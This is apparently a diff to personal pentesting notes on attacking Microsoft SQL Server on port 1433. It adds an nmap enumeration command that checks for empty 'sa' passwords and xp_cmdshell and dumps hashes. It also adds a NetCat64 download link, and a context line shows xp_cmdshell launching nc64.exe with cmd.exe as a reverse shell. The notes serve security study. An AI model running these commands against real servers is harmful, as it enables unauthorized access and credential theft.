@@ -11,6 +11,15 @@ tags:
 
 # 1433 msSQL
 
+## Enumeration
+
+If you don't know anything about the service:
+
+```bash
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+```
+
+
 ## Connect to a remote Microsoft SQL database
 
 For that, we can use a package such as [impacket](impacket.md) and, specifically, the module mssqlclient.py module that you can find in the folder examples:
@@ -88,6 +97,7 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 
 ## Sources and resources
 
++ [nc64.exe](https://github.com/vinsworldcom/NetCat64/releases).
 + [Impacket](impacket.md): mssqlclient.py.  
 + [Pentesmonkey Cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet).
 + [book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server).
